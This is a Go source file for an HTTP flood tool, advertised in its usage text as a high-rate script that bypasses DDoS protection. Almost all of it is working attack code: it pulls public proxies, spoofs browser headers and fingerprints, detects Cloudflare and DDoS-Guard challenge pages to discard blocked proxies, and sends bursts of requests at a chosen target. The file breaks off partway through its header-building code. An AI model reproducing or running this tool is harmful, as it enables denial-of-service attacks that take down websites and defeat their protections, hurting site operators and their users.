package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var refers = []string{
	"https://www.google.com/search?q=",
	"https://check-host.net/",
	"https://www.facebook.com/",
	"https://www.youtube.com/",
	"https://www.fbi.com/",
	"https://www.bing.com/search?q=",
	"https://r.search.yahoo.com/",
	"https://www.cia.gov/index.html",
	"https://vk.com/profile.php?redirect=",
	"https://www.usatoday.com/search/results?q=",
	"https://help.baidu.com/searchResult?keywords=",
	"https://steamcommunity.com/market/search?q=",
	"https://www.ted.com/search?q=",
	"https://play.google.com/store/search?q=",
	"https://www.qwant.com/search?q=",
	"https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
	"https://www.google.ad/search?q=",
	"https://www.google.ae/search?q=",
	"https://www.google.com.af/search?q=",
	"https://www.google.com.ag/search?q=",
	"https://www.google.com.ai/search?q=",
	"https://www.google.al/search?q=",
	"https://www.google.am/search?q=",
	"https://www.google.co.ao/search?q=",
	"http://anonymouse.org/cgi-bin/anon-www.cgi/",
	"http://coccoc.com/search#query=",
	"http://ddosvn.somee.com/f5.php?v=",
	"http://engadget.search.aol.com/search?q=",
	"http://engadget.search.aol.com/search?q=query?=query=&q=",
	"http://eu.battle.net/wow/en/search?q=",
	"http://filehippo.com/search?q=",
	"http://funnymama.com/search?q=",
	"http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
	"http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
	"http://go.mail.ru/search?mail.ru=1&q=",
	"http://help.baidu.com/searchResult?keywords=",
	"http://host-tracker.com/check_page/?furl=",
	"http://itch.io/search?q=",
	"http://jigsaw.w3.org/css-validator/validator?uri=",
	"http://jobs.bloomberg.com/search?q=",
	"http://jobs.leidos.com/search?q=",
	"http://jobs.rbs.com/jobs/search?q=",
	"http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
	"http://louis-ddosvn.rhcloud.com/f5.html?v=",
	"http://millercenter.org/search?q=",
	"http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
	"http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
	"http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
	"http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
	"http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
	"http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
	"http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
	"http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
	"http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=",
}

var encoding_header = []string{
	"*",
	"*/*",
	"gzip",
	"gzip, deflate, br",
	"compress, gzip",
	"deflate, gzip",
	"gzip, identity",
	"gzip, deflate",
	"br",
	"br;q=1.0, gzip;q=0.8, *;q=0.1",
	"gzip;q=1.0, identity; q=0.5, *;q=0",
	"gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25",
	"compress;q=0.5, gzip;q=1.0",
	"identity",
	"gzip, compress",
	"compress, deflate",
	"compress",
	"gzip, deflate, br",
	"deflate",
	"gzip, deflate, lzma, sdch",
	"deflate",
}

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0",
}

var acceptHeaders = []string{
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5",
	"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9",
	"text/html; charset=utf-8",
	"application/json, text/plain, */*",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8",
	"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
}

var langHeaders = []string{
	"en-US,en;q=0.9",
	"en-GB,en;q=0.9",
	"en-CA,en;q=0.9",
	"en-AU,en;q=0.9",
	"en-NZ,en;q=0.9",
	"en-ZA,en;q=0.9",
	"en-IE,en;q=0.9",
	"en-IN,en;q=0.9",
	"ar-SA,ar;q=0.9",
	"az-Latn-AZ,az;q=0.9",
	"be-BY,be;q=0.9",
	"bg-BG,bg;q=0.9",
	"bn-IN,bn;q=0.9",
	"ca-ES,ca;q=0.9",
	"cs-CZ,cs;q=0.9",
	"cy-GB,cy;q=0.9",
	"da-DK,da;q=0.9",
	"de-DE,de;q=0.9",
	"el-GR,el;q=0.9",
	"es-ES,es;q=0.9",
	"et-EE,et;q=0.9",
	"eu-ES,eu;q=0.9",
	"fa-IR,fa;q=0.9",
	"fi-FI,fi;q=0.9",
	"fr-FR,fr;q=0.9",
	"ga-IE,ga;q=0.9",
	"gl-ES,gl;q=0.9",
	"gu-IN,gu;q=0.9",
	"he-IL,he;q=0.9",
	"hi-IN,hi;q=0.9",
	"hr-HR,hr;q=0.9",
	"hu-HU,hu;q=0.9",
	"hy-AM,hy;q=0.9",
	"id-ID,id;q=0.9",
	"is-IS,is;q=0.9",
	"it-IT,it;q=0.9",
	"ja-JP,ja;q=0.9",
	"ka-GE,ka;q=0.9",
	"kk-KZ,kk;q=0.9",
	"km-KH,km;q=0.9",
	"kn-IN,kn;q=0.9",
	"ko-KR,ko;q=0.9",
	"ky-KG,ky;q=0.9",
	"lo-LA,lo;q=0.9",
	"lt-LT,lt;q=0.9",
	"lv-LV,lv;q=0.9",
	"mk-MK,mk;q=0.9",
	"ml-IN,ml;q=0.9",
	"mn-MN,mn;q=0.9",
	"mr-IN,mr;q=0.9",
	"ms-MY,ms;q=0.9",
	"mt-MT,mt;q=0.9",
	"my-MM,my;q=0.9",
	"nb-NO,nb;q=0.9",
	"ne-NP,ne;q=0.9",
	"nl-NL,nl;q=0.9",
	"nn-NO,nn;q=0.9",
	"or-IN,or;q=0.9",
	"pa-IN,pa;q=0.9",
	"pl-PL,pl;q=0.9",
	"pt-BR,pt;q=0.9",
	"pt-PT,pt;q=0.9",
	"ro-RO,ro;q=0.9",
	"ru-RU,ru;q=0.9",
	"si-LK,si;q=0.9",
	"sk-SK,sk;q=0.9",
	"sl-SI,sl;q=0.9",
	"sq-AL,sq;q=0.9",
	"sr-Cyrl-RS,sr;q=0.9",
	"sr-Latn-RS,sr;q=0.9",
	"sv-SE,sv;q=0.9",
	"sw-KE,sw;q=0.9",
	"ta-IN,ta;q=0.9",
	"te-IN,te;q=0.9",
	"th-TH,th;q=0.9",
	"tr-TR,tr;q=0.9",
	"uk-UA,uk;q=0.9",
	"ur-PK,ur;q=0.9",
	"uz-Latn-UZ,uz;q=0.9",
	"vi-VN,vi;q=0.9",
	"zh-CN,zh;q=0.9",
	"zh-HK,zh;q=0.9",
	"zh-TW,zh;q=0.9",
	"am-ET,am;q=0.8",
	"as-IN,as;q=0.8",
	"az-Cyrl-AZ,az;q=0.8",
	"bn-BD,bn;q=0.8",
	"bs-Cyrl-BA,bs;q=0.8",
	"bs-Latn-BA,bs;q=0.8",
	"dz-BT,dz;q=0.8",
	"fil-PH,fil;q=0.8",
	"fr-CA,fr;q=0.8",
	"fr-CH,fr;q=0.8",
	"fr-BE,fr;q=0.8",
	"fr-LU,fr;q=0.8",
	"gsw-CH,gsw;q=0.8",
	"ha-Latn-NG,ha;q=0.8",
	"hr-BA,hr;q=0.8",
	"ig-NG,ig;q=0.8",
	"ii-CN,ii;q=0.8",
	"is-IS,is;q=0.8",
	"jv-Latn-ID,jv;q=0.8",
	"ka-GE,ka;q=0.8",
	"kkj-CM,kkj;q=0.8",
	"kl-GL,kl;q=0.8",
	"km-KH,km;q=0.8",
	"kok-IN,kok;q=0.8",
	"ks-Arab-IN,ks;q=0.8",
	"lb-LU,lb;q=0.8",
	"ln-CG,ln;q=0.8",
	"mn-Mong-CN,mn;q=0.8",
	"mr-MN,mr;q=0.8",
	"ms-BN,ms;q=0.8",
	"mt-MT,mt;q=0.8",
	"mua-CM,mua;q=0.8",
	"nds-DE,nds;q=0.8",
	"ne-IN,ne;q=0.8",
	"nso-ZA,nso;q=0.8",
	"oc-FR,oc;q=0.8",
	"pa-Arab-PK,pa;q=0.8",
	"ps-AF,ps;q=0.8",
	"quz-BO,quz;q=0.8",
	"quz-EC,quz;q=0.8",
	"quz-PE,quz;q=0.8",
	"rm-CH,rm;q=0.8",
	"rw-RW,rw;q=0.8",
	"sd-Arab-PK,sd;q=0.8",
	"se-NO,se;q=0.8",
	"si-LK,si;q=0.8",
	"smn-FI,smn;q=0.8",
	"sms-FI,sms;q=0.8",
	"syr-SY,syr;q=0.8",
	"tg-Cyrl-TJ,tg;q=0.8",
	"ti-ER,ti;q=0.8",
	"tk-TM,tk;q=0.8",
	"tn-ZA,tn;q=0.8",
	"tt-RU,tt;q=0.8",
	"ug-CN,ug;q=0.8",
	"uz-Cyrl-UZ,uz;q=0.8",
	"ve-ZA,ve;q=0.8",
	"wo-SN,wo;q=0.8",
	"xh-ZA,xh;q=0.8",
	"yo-NG,yo;q=0.8",
	"zgh-MA,zgh;q=0.8",
	"zu-ZA,zu;q=0.8",
}

var platform = []string{
	"Windows",
	"Windows Phone",
	"Macintosh",
	"Linux",
	"iOS",
	"Android",
	"PlayStation 4",
	"Xbox One",
	"Nintendo Switch",
	"Apple TV",
	"Amazon Fire TV",
	"Roku",
	"Chromecast",
	"Smart TV",
	"Other",
}

var site = []string{
	"cross-site",
	"same-origin",
	"same-site",
	"none",
}

var mode = []string{
	"cors",
	"navigate",
	"no-cors",
	"same-origin",
}

var dest = []string{
	"document",
	"image",
	"embed",
	"empty",
	"frame",
}

var mediaTypes = []string{
	"text/plain",
	"text/html",
	"application/json",
	"application/xml",
	"multipart/form-data",
	"application/octet-stream",
	"image/jpeg",
	"image/png",
	"audio/mpeg",
	"video/mp4",
	"application/javascript",
	"application/pdf",
	"application/vnd.ms-excel",
	"application/vnd.ms-powerpoint",
	"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
	"application/vnd.openxmlformats-officedocument.presentationml.presentation",
	"application/vnd.openxmlformats-officedocument.wordprocessingml.document",
	"application/zip",
	"image/gif",
	"image/bmp",
	"image/tiff",
	"audio/wav",
	"audio/midi",
	"video/avi",
	"video/mpeg",
	"video/quicktime",
	"text/csv",
	"text/xml",
	"text/css",
	"text/javascript",
	"application/graphql",
	"application/x-www-form-urlencoded",
	"application/vnd.api+json",
	"application/ld+json",
	"application/x-pkcs12",
	"application/x-pkcs7-certificates",
	"application/x-pkcs7-certreqresp",
	"application/x-pem-file",
	"application/x-x509-ca-cert",
	"application/x-x509-user-cert",
	"application/x-x509-server-cert",
	"application/x-bzip",
	"application/x-gzip",
	"application/x-7z-compressed",
	"application/x-rar-compressed",
	"application/x-shockwave-flash",
}

func getRandomInt(min, max int) int {
	return rand.Intn(max-min+1) + min
}

func getRandomChar() string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	return string(charset[rand.Intn(len(charset))])
}

func getPageTitle(bodyStr string) string {
	titleStart := strings.Index(bodyStr, "<title>")
	if titleStart == -1 {
		return ""
	}
	titleStart += len("<title>")
	titleEnd := strings.Index(bodyStr[titleStart:], "</title>")
	if titleEnd == -1 {
		return ""
	}
	return bodyStr[titleStart : titleStart+titleEnd]
}

func containsStringInSlice(str string, list []string) bool {
	for _, v := range list {
		if str == v {
			return true
		}
	}
	return false
}

func main() {
	if len(os.Args) < 5 {
		fmt.Println(`
		New Flood Script
		- High Rps
		- Bypass HTTP-DDoS
      Usage & Example:
        go run flood.go <target> <time> <threads> <ratelimit> [proxy.txt]
        go run flood.go "https://example.com" 120 10 64 proxy.txt`)
		os.Exit(1)
	}
	target := os.Args[1]
	t, _ := strconv.Atoi(os.Args[2])
	thread, _ := strconv.Atoi(os.Args[3])
	rate, _ := strconv.Atoi(os.Args[4])
	var proxyList []string
	u, err := url.Parse(os.Args[1])
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	ur := u.Hostname()
	maxcpu := runtime.NumCPU()
	if thread > maxcpu {
		fmt.Printf("[+] Threads can not high %d", maxcpu)
		os.Exit(0)
	}
	if rate > 128 {
		fmt.Println("[+] Rate can not high 128")
		os.Exit(0)
	}
	if len(os.Args) > 5 {
		proxyFile := os.Args[5]
		file, err := os.Open(proxyFile)
		if err != nil {
			log.Println("[+] Proxy error")
		}
		defer file.Close()
		var proxies []string
		scanner := bufio.NewScanner(file)
		for scanner.Scan() {
			proxies = append(proxies, scanner.Text())
		}
		proxyList = proxies
	} else {
		resp, err := http.Get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all")
		if err != nil {
			log.Println("[+] Proxy error")
		}
		defer resp.Body.Close()
		proxyBytes, _ := ioutil.ReadAll(resp.Body)
		proxyList = strings.Split(string(proxyBytes), "\r\n")
	}
	runtime.GOMAXPROCS(runtime.NumCPU())
	blacklist := make(map[string]bool)
	var mu sync.Mutex
	fmt.Println("[+] Attack Running…")
	for i := 0; i < thread; i++ {
		go func() {
			for {
				go func() {
					mu.Lock()
					var px string
					for {
						rand.Seed(rand.Int63())
						randomIndex := rand.Intn(len(proxyList))
						px = proxyList[randomIndex]
						if !blacklist[px] {
							break
						}
					}
					mu.Unlock()
					proxy := "http://" + px
					proxyUrl, err := url.Parse(proxy)
					if err != nil {
						mu.Lock()
						blacklist[px] = true
						mu.Unlock()
						return
					}
					tr := &http.Transport{
						Proxy: http.ProxyURL(proxyUrl),
						TLSClientConfig: &tls.Config{
							NextProtos:               []string{"h2", "http/1.1"},
							MinVersion:               tls.VersionTLS12,
							MaxVersion:               tls.VersionTLS13,
							InsecureSkipVerify:       true,
							PreferServerCipherSuites: true,
							ServerName:               ur,
							ClientSessionCache:       tls.NewLRUClientSessionCache(0),
							CurvePreferences: []tls.CurveID{
								tls.X25519,
								tls.CurveP256,
								tls.CurveP384,
								tls.CurveP521,
							},
							CipherSuites: []uint16{
								tls.TLS_AES_128_GCM_SHA256,
								tls.TLS_AES_256_GCM_SHA384,
								tls.TLS_CHACHA20_POLY1305_SHA256,
							},
						},
						ForceAttemptHTTP2:   true,
						MaxIdleConns:        10,
						IdleConnTimeout:     30 * time.Second,
						TLSHandshakeTimeout: 10 * time.Second,
					}
					client := &http.Client{
						Transport: tr,
					}
					req, _ := http.NewRequest("GET", target, nil)
					aiRate := getRandomInt(10, rate)
					resh, err := client.Do(req)
					if err != nil {
						//fmt.Println(err)
						mu.Lock()
						blacklist[px] = true
						mu.Unlock()
						return
					}
					defer resh.Body.Close()

					body, err := ioutil.ReadAll(resh.Body)
					if err != nil {
						return
					}
					bodyStr := string(body)
					isCloudflare := false
					if serverHeader := resh.Header.Get("Server"); strings.Contains(serverHeader, "cloudflare") {
						isCloudflare = true
					}
					if cfRayHeader := resh.Header.Get("CF-RAY"); cfRayHeader != "" {
						isCloudflare = true
					}
					if isCloudflare {
						if strings.Contains(bodyStr, "Cloudflare") &&
							(strings.Contains(bodyStr, "Checking your browser before accessing") ||
								strings.Contains(bodyStr, "Please wait... Redirecting...") ||
								strings.Contains(bodyStr, "This website is using a security service to protect itself from online attacks")) {
							fmt.Printf("%s | Cloudflare block\n", px)
							mu.Lock()
							blacklist[px] = true
							mu.Unlock()
							return
						} else {
							title := getPageTitle(bodyStr)
							if containsTitle := []string{"Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Interactive Challenge", "Interactive"}; containsStringInSlice(title, containsTitle) ||
								strings.Contains(strings.ToLower(title), "ddos-guard") {
								fmt.Printf("%s | Cloudflare captcha block\n", px)
								mu.Lock()
								blacklist[px] = true
								mu.Unlock()
								return
							} else {
								rand.Seed(time.Now().UnixNano())
								browserVersion := getRandomInt(120, 123)
								fwfw := []string{"Google Chrome", "Brave"}
								wfwf := fwfw[rand.Intn(len(fwfw))]
								ref := []string{"same-site", "same-origin", "cross-site"}
								ref1 := ref[rand.Intn(len(ref))]
								var brandValue string
								switch browserVersion {
								case 120:
									brandValue = fmt.Sprintf(`"Not_A Brand";v="8", "Chromium";v="%d", "%s";v="%d"`, browserVersion, wfwf, browserVersion)
								case 121:
									brandValue = fmt.Sprintf(`"Not A(Brand";v="99", "%s";v="%d", "Chromium";v="%d"`, wfwf, browserVersion, browserVersion)
								case 122:
									brandValue = fmt.Sprintf(`"Chromium";v="%d", "Not(A:Brand";v="24", "%s";v="%d"`, browserVersion, wfwf, browserVersion)
								case 123:
									brandValue = fmt.Sprintf(`"%s";v="%d", "Not:A-Brand";v="8", "Chromium";v="%d"`, wfwf, browserVersion, browserVersion)
								}
								isBrave := wfwf == "Brave"
								acceptHeaderValue := ""
								if isBrave {
									acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"
								} else {
									acceptHeaderValue = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								}
								langValue := ""
								if isBrave {
									langValue = "en-US,en;q=0.9"
								} else {
									langValue = "en-US,en;q=0.7"
								}
								secGpcValue := ""
								if isBrave {
									secGpcValue = "1"
								}
								secChUaModel := ""
								if isBrave {
									secChUaModel = `""`
								}
								secChUaPlatform := ""
								if isBrave {
									secChUaPlatform = "Windows"
								}
								secChUaPlatformVersion := ""
								if isBrave {
									secChUaPlatformVersion = "10.0.0"
								}
								secChUaMobile := ""
								if isBrave {
									secChUaMobile = "?0"
								}
								userAgent := fmt.Sprintf("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36", browserVersion)
								secChUa := brandValue
								headers := map[string]string{
									"sec-ch-ua":                 secChUa,
									"sec-ch-ua-mobile":          "?0",
									"sec-ch-ua-platform":        "\"Windows\"",
									"upgrade-insecure-requests": "1",
									"user-agent":                userAgent,
									"accept":                    acceptHeaderValue,
									"accept-encoding":           "gzip, deflate, br",
									"accept-language":           langValue,
									"sec-fetch-site":            ref1,
									"sec-fetch-mode":            "navigate",
									"sec-fetch-user":            "?1",
									"sec-fetch-dest":            "document",
								}
								if secGpcValue != "" {
									headers["sec-gpc"] = secGpcValue
								}
								if secChUaMobile != "" {
									headers["sec-ch-ua-mobile"] = secChUaMobile
								}
								if secChUaModel != "" {
									headers["sec-ch-ua-model"] = secChUaModel
								}
								if secChUaPlatform != "" {
									headers["sec-ch-ua-platform"] = secChUaPlatform
								}
								if secChUaPlatformVersion != "" {
									headers["sec-ch-ua-platform-version"] = secChUaPlatformVersion
								}
								headers2 := map[string]string{}
								if rand.Float64() < 0.3 {
									headers2[fmt.Sprintf("x-client-session%s", getRandomChar())] = fmt.Sprintf("none%s", getRandomChar())
								}
								if rand.Float64() < 0.3 {
									headers2[fmt.Sprintf("sec-ms-gec-version%s", getRandomChar())] = fmt.Sprintf("undefined%s", getRandomChar())
								}
								if rand.Float64() < 0.3 {
									headers2[fmt.Sprintf("sec-fetch-users%s", getRandomChar())] = fmt.Sprintf("?0%s", getRandomChar())
								}
								if rand.Float64() < 0.3 {
									headers2[fmt.Sprintf("x-request-data%s", getRandomChar())] = fmt.Sprintf("dynamic%s", getRandomChar())
								}
								for k, v := range headers2 {
									headers[k] = v
								}
								for i := 0; i < aiRate; i++ {
									go client.Do(req)
								}
							}
						}
					} else {
						title := getPageTitle(bodyStr)
						if containsTitle := []string{"Just a moment...", "Checking your browser...", "Access denied", "DDOS-GUARD", "Interactive Challenge", "Interactive"}; containsStringInSlice(title, containsTitle) ||
							strings.Contains(strings.ToLower(title), "ddos-guard") {
							fmt.Printf("%s | captcha block!\n", px)
							mu.Lock()
							blacklist[px] = true
							mu.Unlock()
							return
						} else {
							var secFetchUser, acceptEncoding, secFetchDest, secFetchMode, secFetchSite, accept, priority string
							browsers := []string{"Google Chrome", "Opera", "Edge", "Brave", "Safari", "Firefox", "Rand"}
							browser := browsers[rand.Intn(len(browsers))]
							switch browser {
							case "Rand":
								req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
								req.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
								req.Header.Set("Sec-Fetch-Site", site[rand.Intn(len(site))])
								req.Header.Set("Sec-Fetch-Mode", mode[rand.Intn(len(mode))])
								req.Header.Set("Sec-Fetch-Dest", dest[rand.Intn(len(dest))])
								req.Header.Set("sec-fetch-user", "?1")
								req.Header.Set("sec-ch-ua-platform", platform[rand.Intn(len(platform))])
								req.Header.Set("accept-encoding", encoding_header[rand.Intn(len(encoding_header))])
								req.Header.Set("Accept-Language", langHeaders[rand.Intn(len(langHeaders))])
								req.Header.Set("Content-Type", mediaTypes[rand.Intn(len(mediaTypes))])
								req.Header.Set("priority", "u=1, i")
								req.Header.Set("Cache-Control", "no-cache")
								req.Header.Set("Pragma", "no-cache")
								req.Header.Set("Expires", "0")
								req.Header.Set("Connection", "keep-alive")
							case "Firefox":
								rand.Seed(time.Now().UnixNano())
								version := rand.Intn(112-99+1) + 99
								secFetchUser := "?0"
								if rand.Float32() >= 0.5 {
									secFetchUser = "?1"
								}
								acceptEncoding := "gzip, deflate, br, zstd"
								if rand.Float32() >= 0.5 {
									acceptEncoding = "gzip, deflate, br"
								}
								secFetchDest := "document"
								if rand.Float32() >= 0.5 {
									secFetchDest = "empty"
								}
								secFetchMode := "navigate"
								if rand.Float32() >= 0.5 {
									secFetchMode = "cors"
								}
								secFetchSite := "none"
								if rand.Float32() >= 0.5 {
									secFetchSite = "same-site"
								}
								accept := "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
								if rand.Float32() >= 0.5 {
									accept = "application/json"
								}
								priority := "u=0, i"
								if rand.Float32() >= 0.5 {
									priority = "u=1, i"
								}
								platform := "Windows"
								req.Header.Set("sec-ch-ua", fmt.Sprintf(`"Firefox";v="%d", "Gecko";v="20100101", "Mozilla";v="%d"`, version, version))
								req.Header.Set("sec-ch-ua-mobile", "?0")
								req.Header.Set("sec-ch-ua-platform", platform)
								req.Header.Set("user-agent", fmt.Sprintf(`Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:%d.0) Gecko/20100101 Firefox/%d.0`, version, version))
								req.Header.Set("accept", accept)
								req.Header.Set("sec-fetch-site", secFetchSite)
								req.Header.Set("sec-fetch-mode", secFetchMode)
								req.Header.Set("sec-fetch-user", secFetchUser)
								req.Header.Set("sec-fetch-dest", secFetchDest)
